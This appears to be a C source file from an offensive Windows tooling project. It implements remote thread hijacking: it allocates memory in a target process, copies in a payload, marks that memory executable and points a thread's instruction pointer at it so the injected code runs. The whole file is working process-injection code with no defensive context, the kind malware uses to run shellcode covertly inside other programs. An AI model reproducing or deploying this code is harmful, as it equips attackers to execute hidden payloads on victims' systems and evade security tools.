#include <Windows.h>
#include "misc.h"


BOOL remoteThreadHijacking(IN HANDLE hProcess, IN HANDLE hThread, IN PBYTE pbPayload, IN SIZE_T sPayload) {

	PVOID pAddress = NULL;
	DWORD dwOldProtection = NULL;
	BOOL bRet = FALSE;

	CONTEXT ThreadCtx;
	ThreadCtx.ContextFlags = CONTEXT_CONTROL;


	wprintf(L"[>] Remote Thread injection: START\n");

	do {
		wprintf(L"\t[i] Allocating memory for payload... ");
		pAddress = VirtualAllocEx(hProcess, NULL, sPayload, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
		if (pAddress == NULL)
		{
			printError(L"VirtualAllocEx");
			break;
		}
		wprintf(L"done, 0x%p\n", pAddress);

		wprintf(L"\t[i] Copying payload... ");
		bRet = WriteProcessMemory(hProcess, pAddress, pbPayload, sPayload, NULL);
		if (!bRet)
		{
			printError(L"WriteProcessMemory");
			break;
		}
		wprintf(L"done\n");

		wprintf(L"\t[i] Adding execution rights... ");
		bRet = VirtualProtectEx(hProcess, pAddress, sPayload, PAGE_EXECUTE_READWRITE, &dwOldProtection);
		if (!bRet)
		{
			printError(L"VirtualProtectEx");
			break;
		}
		wprintf(L"done\n");

		wprintf(L"\t[i] Getting thread context... ");
		bRet = GetThreadContext(hThread, &ThreadCtx);
		if (!bRet)
		{
			printError(L"GetThreadContext");
			break;
		}
		wprintf(L"done\n");

		wprintf(L"\t[i] Setting RIP to point payload buffer... ");
		ThreadCtx.Rip = (DWORD64)pAddress;
		wprintf(L"done\n");

		wprintf(L"\t[i] Updating the new thread context... ");
		bRet = SetThreadContext(hThread, &ThreadCtx);
		if (!bRet)
		{
			printError(L"SetThreadContext");
			break;
		}
		wprintf(L"done\n");

		wprintf(L"[<] Remote Thread injection: DONE\n");
		return TRUE;

	} while (FALSE);

	wprintf(L"[<] Remote Thread injection: FAILED\n");
	return FALSE;
}
